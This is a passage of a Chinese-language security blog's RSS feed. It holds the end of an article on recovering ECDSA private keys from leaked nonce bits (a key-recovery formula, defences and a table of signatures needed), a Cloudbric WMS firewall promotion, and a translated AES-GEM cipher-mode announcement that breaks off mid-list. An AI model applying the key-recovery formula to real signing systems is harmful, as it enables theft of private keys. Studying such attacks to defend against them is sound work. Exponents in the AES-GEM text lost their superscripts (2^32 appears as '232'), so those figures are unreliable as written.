&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;row2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mᵢsᵢ&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;⁻¹&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mₙsₙ&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;⁻¹&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rₙs₁&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;r₁sₙ&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;⁻¹&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sₙm₁&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s₁mₙ&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s₁sₙ&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;k₁&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kₙ&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;防护方案&#34;&gt;防护方案
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;替代方案&lt;/strong&gt;：优先使用EdDSA（如Ed25519）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;恒定时间实现&lt;/strong&gt;：防止时序侧信道&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;RFC 6979&lt;/strong&gt;：确定性nonce生成&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;盲签名技术&lt;/strong&gt;：隐藏时序信息&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;攻击签名数需求表&#34;&gt;攻击签名数需求表
&lt;/h2&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;固定比特数&lt;/th&gt;
          &lt;th&gt;所需签名数&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;128-bit&lt;/td&gt;
          &lt;td&gt;2&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;80-bit&lt;/td&gt;
          &lt;td&gt;5&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;4-bit&lt;/td&gt;
          &lt;td&gt;20&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;blockquote&gt;
&lt;p&gt;警告：即使仅1比特泄露，观察足够签名后系统仍可能被完全攻破。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>使用Cloudbric WMS强化AWS安全：构建强大Web应用防火墙的五大关键点</title>
        <link>http://localhost:1313/p/%E4%BD%BF%E7%94%A8cloudbric-wms%E5%BC%BA%E5%8C%96aws%E5%AE%89%E5%85%A8%E6%9E%84%E5%BB%BA%E5%BC%BA%E5%A4%A7web%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E4%BA%94%E5%A4%A7%E5%85%B3%E9%94%AE%E7%82%B9/</link>
        <pubDate>Sat, 02 Aug 2025 07:45:50 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BD%BF%E7%94%A8cloudbric-wms%E5%BC%BA%E5%8C%96aws%E5%AE%89%E5%85%A8%E6%9E%84%E5%BB%BA%E5%BC%BA%E5%A4%A7web%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E4%BA%94%E5%A4%A7%E5%85%B3%E9%94%AE%E7%82%B9/</guid>
        <description>&lt;h3 id=&#34;在日益数字化的生态系统中保护在线资产不仅是建议更是必需随着web应用复杂度提升和网络威胁日益精密企业需要多层次的安全防护aws通过其web应用防火墙waf提供了坚实基础但需专业管理才能最大化其潜力cloudbric-wmswaf托管服务应运而生精准提升aws安全态势并解决关键漏洞&#34;&gt;在日益数字化的生态系统中，保护在线资产不仅是建议，更是必需。随着Web应用复杂度提升和网络威胁日益精密，企业需要多层次的安全防护。AWS通过其Web应用防火墙（WAF）提供了坚实基础，但需专业管理才能最大化其潜力。Cloudbric WMS（WAF托管服务）应运而生，精准提升AWS安全态势并解决关键漏洞。
&lt;/h3&gt;&lt;p&gt;Cloudbric WMS旨在通过简化管理、专业支持和主动防御策略来扩展AWS原生功能。本文将深入探讨五大核心议题：&lt;strong&gt;OWASP Top 10防护、恶意流量缓解、API安全、实时流量监控和误报减少&lt;/strong&gt;。了解这些领域的重要性及Cloudbric WMS的解决方案，助您抵御最复杂的攻击。&lt;/p&gt;
&lt;h3 id=&#34;1-owasp-top-10防护web安全的基石&#34;&gt;1. OWASP Top 10防护：Web安全的基石
&lt;/h3&gt;&lt;p&gt;OWASP Top 10是全球公认的Web应用必防安全风险清单，如SQL注入、跨站脚本（XSS）和配置错误等实际漏洞可能导致严重数据泄露。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;为何重要？&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;核心安全基础&lt;/strong&gt;：Cloudbric WMS通过持续威胁情报更新确保过滤机制符合最新OWASP标准。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;实战攻击缓解&lt;/strong&gt;：针对常见编码错误优化规则，有效拦截攻击。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;合规与信任&lt;/strong&gt;：满足监管要求，增强客户信任。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;实现方式&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;自动化规则集部署，专家团队持续维护更新。&lt;/li&gt;
&lt;li&gt;透明化安全分析，提供漏洞尝试与拦截数据，助力策略优化。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-恶意流量缓解抵御自动化威胁&#34;&gt;2. 恶意流量缓解：抵御自动化威胁
&lt;/h3&gt;&lt;p&gt;自动化机器人可实施凭据填充、内容爬取和DDoS攻击，危害应用性能与安全。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;威胁现状&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;凭据填充与欺诈&lt;/strong&gt;：利用弱密码批量登录，导致数据泄露。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;内容爬取&lt;/strong&gt;：窃取定价或知识产权，削弱竞争优势。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;解决方案&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;行为分析&lt;/strong&gt;：实时识别异常流量模式（如单IP高频访问）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;威胁情报整合&lt;/strong&gt;：动态更新恶意IP库。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;自适应学习&lt;/strong&gt;：通过机器学习应对不断演变的机器人策略。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;3-api安全守护数字门户&#34;&gt;3. API安全：守护数字门户
&lt;/h3&gt;&lt;p&gt;API已成为主要攻击向量，需专业防护以避免数据暴露或服务中断。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;关键挑战&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;攻击面扩大&lt;/strong&gt;：API是现代应用的通信核心，也是潜在弱点。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;专用防护&lt;/strong&gt;：Cloudbric WMS针对注入攻击、身份验证缺陷等定制规则，确保仅合法请求访问后端。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;实践效果&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;结合AWS WAF分析API调用模式，实时拦截恶意流量。&lt;/li&gt;
&lt;li&gt;最小化误报，保障用户体验与性能。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;4-实时流量监控主动防御的眼睛&#34;&gt;4. 实时流量监控：主动防御的“眼睛”
&lt;/h3&gt;&lt;p&gt;即时洞察流量是检测和缓解威胁的关键。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;核心价值&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;瞬时威胁发现&lt;/strong&gt;：秒级延迟可能决定事件影响范围。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;数据驱动决策&lt;/strong&gt;：仪表盘展示请求量、IP信誉等指标，支持快速策略调整。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Cloudbric WMS优势&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;直观面板呈现威胁拦截、可疑活动等数据。&lt;/li&gt;
&lt;li&gt;详细日志支持事件溯源与策略优化。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;5-误报减少提升devsecops效率&#34;&gt;5. 误报减少：提升DevSecOps效率
&lt;/h3&gt;&lt;p&gt;过度误报会阻塞系统，增加团队负担。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;影响&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;运营效率&lt;/strong&gt;：误拦截需手动处理，拖慢响应速度。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;用户体验&lt;/strong&gt;：错误阻拦导致客户流失。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;优化措施&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;机器学习结合历史流量模式，精准区分异常与合法请求。&lt;/li&gt;
&lt;li&gt;基于实时反馈调整规则，降低误报率，释放团队精力。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;结语cloudbric-wms赋能aws安全&#34;&gt;结语：Cloudbric WMS赋能AWS安全
&lt;/h3&gt;&lt;p&gt;面对日新月异的威胁，Cloudbric WMS以OWASP防护、机器人防御、API安全、实时监控和误报控制五大核心，为企业提供动态、精准的保护。通过自动化与专家分析的结合，构建适应未来威胁的弹性安全环境。&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://aws.amazon.com/marketplace/pp/prodview-xxx&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;立即体验Cloudbric WMS免费试用&lt;/a&gt;，开启您的全方位Web应用安全之旅。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>宣布AES-GEM（带伽罗瓦扩展模式的AES）——增强AES-GCM安全性的新加密模式</title>
        <link>http://localhost:1313/p/%E5%AE%A3%E5%B8%83aes-gem%E5%B8%A6%E4%BC%BD%E7%BD%97%E7%93%A6%E6%89%A9%E5%B1%95%E6%A8%A1%E5%BC%8F%E7%9A%84aes%E5%A2%9E%E5%BC%BAaes-gcm%E5%AE%89%E5%85%A8%E6%80%A7%E7%9A%84%E6%96%B0%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F/</link>
        <pubDate>Sat, 02 Aug 2025 07:29:18 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%AE%A3%E5%B8%83aes-gem%E5%B8%A6%E4%BC%BD%E7%BD%97%E7%93%A6%E6%89%A9%E5%B1%95%E6%A8%A1%E5%BC%8F%E7%9A%84aes%E5%A2%9E%E5%BC%BAaes-gcm%E5%AE%89%E5%85%A8%E6%80%A7%E7%9A%84%E6%96%B0%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F/</guid>
        <description>&lt;h1 id=&#34;宣布aes-gem带伽罗瓦扩展模式的aes&#34;&gt;宣布AES-GEM（带伽罗瓦扩展模式的AES）
&lt;/h1&gt;&lt;p&gt;今天，AES-GCM是TLS 1.3使用的两种加密模式之一（另一种是ChaCha20-Poly1305），也是FIPS验证模块中加密数据的首选方法。但尽管取得了巨大成功，AES-GCM也曾导致一些灾难性故障：例如Hanno Böck和Sean Devlin利用nonce重用漏洞将他们的Black Hat USA幻灯片注入MI5网站。&lt;/p&gt;
&lt;p&gt;多年来，安全研究人员一直在警告AES-GCM的弱点。19年前，Niels Ferguson向NIST提交论文指出AES-GCM存在的认证弱点（尽管NIST最终将其标准化）。今年早些时候，亚马逊发布论文详细说明了AES-GCM的实际挑战，并认为AES的128位块大小已不再足够，更倾向于使用256位块密码（即Rijndael-256）。&lt;/p&gt;
&lt;p&gt;为解决这些问题，我提出了一种名为Galois Extended Mode（简称GEM）的新块密码模式，上个月已在NIST关于手风琴模式密码需求的研讨会上展示。AES-GEM以最小的性能开销在各个方面提升了GCM的安全性。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;重要提示&lt;/strong&gt;：当前AES-GEM设计尚未准备好投入生产使用，因为某些细节可能会在未来发生变化。要理解当前设计，让我们先了解AES-GCM的不足，然后讨论如何用GEM做得更好。&lt;/p&gt;
&lt;h2 id=&#34;aes工作原理&#34;&gt;AES工作原理
&lt;/h2&gt;&lt;p&gt;在深入之前，有必要为部分读者解释本文中使用的一些术语和概念。&lt;/p&gt;
&lt;p&gt;AES（高级加密标准）是一种广泛用于加密信息的块密码。它支持多种密钥大小（128位、192位和256位密钥），但始终操作128位块。AES是Rijndael块密码家族的标准化形式。Rijndael支持其他块大小，但NIST仅标准化了128位块。现代处理器提供专用硬件指令加速AES操作，但AES密钥调度仍可能对性能产生负面影响。&lt;/p&gt;
&lt;p&gt;ECB（电子密码本）模式是没有块密码操作模式的情况。它涉及直接在数据块上计算块密码。正如许多密码学家所证明的，ECB模式不是语义安全的。为提高安全性，像AES这样的块密码通常与操作模式一起使用。（如果没有，几乎肯定应该这样做。如果您认为正在使用ECB加密敏感数据，请联系我们的密码学团队。）&lt;/p&gt;
&lt;p&gt;CTR（计数器模式）是一种块密码操作模式，其中递增的值序列通过块密码加密以产生伪随机密钥流。要加密数据，只需计算每个明文字节与相应密钥流字节的XOR。&lt;/p&gt;
&lt;p&gt;GCM（伽罗瓦/计数器模式）是一种提供认证加密的块密码操作模式。密码学家称之为AEAD模式：带附加数据的认证加密。GCM可以为敏感数据提供机密性，为敏感和公共数据提供完整性。&lt;/p&gt;
&lt;p&gt;AEAD模式对于设计密码系统非常重要，这些系统能够抵抗试图改变加密数据以研究系统行为从而希望获得密码分析有用信息的攻击者。&lt;/p&gt;
&lt;p&gt;GCM是用于加密明文的计数器模式（CTR）和用于认证密文（以及如果提供，附加关联数据）的伽罗瓦域消息认证码（GMAC）的组合。GMAC使用称为GHASH的函数定义，该函数是在认证数据上评估的多项式。GHASH的输出与加密计数器块的XOR产生最终认证标签。认证密钥H通过加密128位零块计算得出。&lt;/p&gt;
&lt;p&gt;POLYVAL是GHASH的替代方案，用于AES-GCM-SIV。POLYVAL使用的不可约多项式是GHASH不可约多项式的反转。&lt;/p&gt;
&lt;p&gt;许多密码模式（包括GCM和CTR）要求每个消息使用一个仅使用一次的数字。这个永远不应重复的公共数字称为nonce。&lt;/p&gt;
&lt;p&gt;最后，生日边界是概率论中的一个概念，表示一组随机值中冲突的可能性。在密码学中，它意味着如果随机选择nonce，随着使用更多nonce，两个nonce冲突的概率显著增加。对于具有96位nonce的AES-GCM，大约232条消息后，有1/232的nonce冲突概率，这可能导致诸如伪造消息等安全漏洞。&lt;/p&gt;
&lt;h2 id=&#34;aes-gcm当前的实际挑战&#34;&gt;AES-GCM当前的实际挑战
&lt;/h2&gt;&lt;p&gt;正如其他人指出的那样，AES-GCM的最大挑战是AES只有128位块大小。这有两个主要后果：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;公共nonce和内部计数器的大小被限制为总共128位。实际上，nonce大小通常为96位，计数器为32位。如果选择更大的nonce，它会被哈希压缩到适当大小，这对安全性几乎没有改善。如果重用nonce，则会泄漏认证子密钥，因此可以无限期伪造消息。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在相同密钥下加密超过一定数量的块后，攻击者可以以显著概率区分密文和随机字节。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;当您理解我们处理的是2的幂时，96位nonce空间可能听起来很多，但如果随机选择nonce，只能加密232条消息，然后有2-32的冲突概率。使用具有更大块大小的密码可以缓解这一点，但这不是唯一的解决方法。&lt;/p&gt;
&lt;p&gt;AES块大小不是AES-GCM实践中唯一的问题。正如Niels Ferguson在2005年指出的那样，针对短标签的成功伪造会揭示认证子密钥。&lt;/p&gt;
&lt;p&gt;此外，我们还了解到AES-GCM具有一个意外属性，即多个密钥可以解密相同的密文+认证标签。其发现者将这个问题称为&amp;quot;隐形蝾螈&amp;quot;，因为它允许他们在一款加密消息应用程序的滥用报告工具中隐藏蝾螈图片。在使用AES-GCM的协议中防止隐形蝾螈需要对使用的密钥进行某种单向承诺。&lt;/p&gt;
&lt;p&gt;最后，AES-GCM中单个消息的最大明文长度相对较小：略低于64 GiB。为应对此最大长度，软件通常将较大消息分解为适合此长度限制的较短帧。这导致生日边界前的有限nonce空间比如果容忍较长消息时更快耗尽。&lt;/p&gt;
&lt;h2 id=&#34;介绍aes-gem&#34;&gt;介绍AES-GEM
&lt;/h2&gt;&lt;p&gt;我们的提案Galois Extended Mode是对GCM（伽罗瓦/计数器模式）的修改，目前解决了大多数这些弱点。然而，关于我们想要采用哪种策略来缓解最后一点，仍然存在一个开放性问题，我将在稍后解释。&lt;/p&gt;
&lt;p&gt;在高层次上，我们提出了两种变体：AES-128-GEM和AES-256-GEM。我们还使用标准AEAD接口指定了两种AEAD构造。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;AES-128-GEM&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;密钥长度：128位&lt;/li&gt;
&lt;li&gt;子密钥长度：128位&lt;/li&gt;
&lt;li&gt;Nonce长度：192位&lt;/li&gt;
&lt;li&gt;最大明文长度：261 – 1字节&lt;/li&gt;
&lt;li&gt;最大AAD长度：261 – 1字节&lt;/li&gt;
&lt;li&gt;标签长度：48字节（AEAD）或16字节（无承诺）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;AES-256-GEM&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;密钥长度：256位&lt;/li&gt;
&lt;li&gt;子密钥长度：256位&lt;/li&gt;
&lt;li&gt;Nonce长度：256位&lt;/li&gt;
&lt;li&gt;最大明文长度：261 – 1字节&lt;/li&gt;
&lt;li&gt;最大AAD长度：261 – 1字节&lt;/li&gt;
&lt;li&gt;标签长度：48字节（AEAD）或16字节（无承诺）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;从gcm到gem的道路&#34;&gt;从GCM到GEM的道路
&lt;/h2&gt;&lt;p&gt;如果您从AES-GCM的现有设计开始并进行以下更改，您将得到GEM的当前草案。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Nonce扩展&lt;/strong&gt;
首先，我们需要一个更长的nonce，我们将在下一步中用于子密钥派生。&lt;/p&gt;
&lt;p&gt;对于256位密钥，256位nonce是一个很好的整数。对于128位密钥，我们最终需要192位。&lt;/p&gt;
&lt;p&gt;无论哪种情况，最右边的64位将保留用于实际底层加密。剩余的位（AES-256为192位，AES-128为128位）将用于子密钥派生。&lt;/p&gt;
&lt;p&gt;这使我们能够分摊密钥派生的成本，并在多个消息上设置AES密钥调度，前提是nonce和密钥的前（n – 64）位相同。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;子密钥派生&lt;/strong&gt;
使用AES进行密钥派生有多种策略。在Real World Cryptography 2024上，Shay Gueron展示了DNDK-GCM，它使用了一种有趣的结构来实现子密钥派生。&lt;/p&gt;
&lt;p&gt;我们希望保持简单和易于理解。因此，我们基于CBC-MAC构建了密钥派生策略，因为CMAC已经是FIPS批准的MAC（即用于AES-CCM）。&lt;/p&gt;
&lt;p&gt;在AES-256的情况下，我们使用两个CBC-MAC输出来派生256位子密钥。然而，这种方法有一个微妙恼人的特性：两半永远不会产生相同的输出，因此严格来说，可能的输出少于2256个。&lt;/p&gt;
&lt;p&gt;在GEM的两种变体中，我们借用了Salsa20设计中的一个技巧：将输出与输入密钥进行XOR，以确保子密钥对于任何不知道输入密钥的攻击者来说与均匀随机无法区分。如果您不知道此密钥，则输出与适当长度的随机密钥无法区分。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;支持更长的消息&lt;/strong&gt;
我们需要64位剩余nonce而不是GCM典型的96位的原因是我们的内部计数器大小不是32位长。相反，它是64位长。&lt;/p&gt;
&lt;p&gt;否则，如当前所写，GEM的行为与您对GCM的期望相同：它使用计数器模式进行批量数据加密。让我们暂时搁置这一点，稍后再讨论。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;改进的认证安全性&lt;/strong&gt;
我们的现有设计AES-GCM按以下方式构建：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过用密钥加密全清零块派生认证子密钥H。&lt;/li&gt;
&lt;li&gt;计算密文、关联数据和包含两者长度（以位为单位）的块的GHASH()。&lt;/li&gt;
&lt;li&gt;将步骤2的输出与计数器块的AES-CTR加密进行XOR。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;我们的设计大致相同，但有一个重要的调整：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过用子密钥加密全置位块派生认证子密钥H。&lt;/li&gt;
&lt;li&gt;计算密文、关联数据和包含两者长度（以位为单位）的块的GHASH()。&lt;/li&gt;
&lt;li&gt;使用输入密钥通过AES-ECB加密步骤2的输出。&lt;/li&gt;
&lt;li&gt;将步骤3的输出与计数器块的AES-CTR加密进行XOR。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;步骤3直接解决了Niels Ferguson在2005年指出的AES-GCM弱点。其他更改是实现细节。&lt;/p&gt;
&lt;p&gt;此调整为短标签提供了更好的安全性，因为原始GHASH输出位的AES加密是一种非线性变换，没有密钥无法反转。我们使用输入密钥而不是子密钥，因为唯一其他使用输入密钥加密数据的地方（即子密钥派生）永远不会直接暴露。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;密钥承诺&lt;/strong&gt;
在我们解决GEM对隐形蝾螈式攻击的保护之前，我们需要分析设计中的其他一些微妙之处。&lt;/p&gt;
&lt;p&gt;GCM和GEM的最终块中的组件长度都以位而非字节表示，并且每个都限制为264。这意味着，尽管由于内部计数器，GEM理论上可以允许每条消息最多264块（或268字节）的明文，但我们必须调整最终的GHASH步骤以适应这种额外开销。&lt;/p&gt;
&lt;p&gt;相反，内部计数器的不可达值保留用于密码的内部使用。具体来说，内部计数器值以0x02000000 00000000到0xFFFFFFFF FFFFFFFF结尾的无法在尊重明文261 – 1字节限制的同时达到。&lt;/p&gt;
&lt;p&gt;全置位块（0xFFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF）已在GEM中用于认证子密钥，而64位尾部nonce + 0xFFFFFFFF 0xFFFFFFFE用于计数器块，用于最终认证标签计算。&lt;/p&gt;
&lt;p&gt;为提供密钥承诺，接下来的两个块，nonce + 0xFFFFFFFF 0xFFFFFFFC和0xFFFFFFFF 0xFFFFFFFD将用作密钥和nonce的承诺值。&lt;/p&gt;
&lt;p&gt;我们指定两个块是因为在此处使用一个AES块是不够的。考虑AES-256的情况，它具有256位密钥和128位块：根据鸽巢原理，我们预计有2128个不同的密钥将给定的固定明文值映射到固定密文值。因此，单个块不足以进行承诺。然而，假设块密码是安全的，对于两个连续块，不需要这种鸽巢考虑。&lt;/p&gt;
&lt;p&gt;通过这种方式，我们可以快速生成给定密钥和nonce的承诺值。&lt;/p&gt;
&lt;p&gt;在AEAD接口中，承诺附加到认证标签。解密消息时，必须以恒定时间将两者与其重新计算的值进行比较。&lt;/p&gt;
&lt;h2 id=&#34;aes-gem的性能特征&#34;&gt;AES-GEM的性能特征
&lt;/h2&gt;&lt;p&gt;尽管我们已经解决了GCM的大部分痛点，但GEM的实际性能影响很小。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;AES-256-GEM：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;密钥派生：四个额外的AES加密块，一些XOR，一个额外的密钥调度&lt;/li&gt;
&lt;li&gt;认证：一个额外的AES加密块&lt;/li&gt;
&lt;li&gt;密钥承诺：两个额外的AES加密块&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;AES-128-GEM：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;密钥派生：两个额外的AES加密块，一些XOR，一个额外的密钥调度&lt;/li&gt;
&lt;li&gt;认证：一个额外的AES加密块&lt;/li&gt;
&lt;li&gt;密钥承诺：两个额外的AES加密块&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;由于如今AES由于硬件加速非常快，这种性能影响在除最性能敏感的应用外的所有应用中应该几乎不明显。在这些情况下，如果派生子密钥被缓存，密钥派生性能成本可以在多达232条不同消息中分摊。&lt;/p&gt;
&lt;h2 id=&#34;完善aes-gem&#34;&gt;完善AES-GEM
&lt;/h2&gt;&lt;p&gt;当前GEM草案未充分解决的一个最终问题，但我们希望在NIST研讨会上讨论此问题，并肯定会在最终设计中解决。&lt;/p&gt;
&lt;p&gt;尽管我们的GEM草案构造允许比GCM更长的消息，但AES块大小使其按原样使用存在风险。主要担忧是加密非常长的消息会给攻击者带来显著优势，以区分AES-GEM密文与随机字节序列。（这是亚马逊2024年论文中提出的一个担忧。）&lt;/p&gt;
&lt;p&gt;我们可以通过几种方式完善GEM以解决此弱点，这些方式具有不同的性能特征和权衡。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;宽块PRP&lt;/strong&gt;
多年来，许多密码设计使用宽块PRP（如XTS模式中的AES）安全加密超过AES块大小通常允许的范围。由于XTS广泛用于磁盘加密，这种方法可能会证明是安全的。&lt;/p&gt;
&lt;p&gt;然而，XTS模式目前尚未标准化用于磁盘加密以外的用例。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;分层密钥派生&lt;/strong&gt;
如果不直接使用子密钥，而是使用内部计数器的高32位从保留的nonce空间中选择不同的值，加密该值，并每236字节派生一个新的子密钥呢？然后，我们仅使用此子密钥加密计数器的剩余32位，这与AES-GCM几十年来所做的类似。&lt;/p&gt;
&lt;p&gt;此子子密钥派生可以类似于密钥承诺构建：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对于AES-256-GEM，加密来自保留nonce空间的32字节，并将其用作实际CTR密钥。&lt;/li&gt;
&lt;li&gt;对于AES-128-GEM，加密来自保留nonce空间的16字节（但与AES-256-GEM选择的不同nonce空间），并将其用作实际底层CTR密钥。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这是一个有吸引力的选择，原因有很多。最重要的是，这种策略将以非常直接的方式规避PRP区分器问题。它也不依赖于任何非标准设计（如XTS模式）。您可以使用FIPS批准的组件构建整个东西，就像我们对AES-GEM的其余草案设计所做的那样。&lt;/p&gt;
&lt;p&gt;缺点？这种方法确实会在每236字节明文时产生另一个密钥调度。这可能仍然很好地分摊，但值得记住。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;带分层密钥派生的AES-GEM的总性能成本&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;AES-256-GEM：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;密钥派生：四个额外的AES加密块，一些XOR，一个额外的密钥调度&lt;/li&gt;
&lt;li&gt;每236字节明文的额外密钥派生：两个额外的AES加密块，一个额外的密钥调度&lt;/li&gt;
&lt;li&gt;认证：一个额外的AES加密块&lt;/li&gt;
&lt;li&gt;密钥承诺：两个额外的AES加密块&lt;/li&gt;
&lt;li&gt;1 GB明文的额外总开销：七个AES-256块，两个额外的AES-256密钥调度&lt;/li&gt;
&lt;li&gt;1 TB明文的额外总开销：37个AES-256块，17个额外的AES-256密钥调度&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;AES-128-GEM：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;密钥派生：两个额外的AES加密块，一些XOR，一个额外的密钥调度&lt;/li&gt;
&lt;li&gt;每236字节明文的额外密钥派生：一个额外的AES加密块，一个额外的密钥调度&lt;/li&gt;
&lt;li&gt;认证：一个额外的AES加密块&lt;/li&gt;
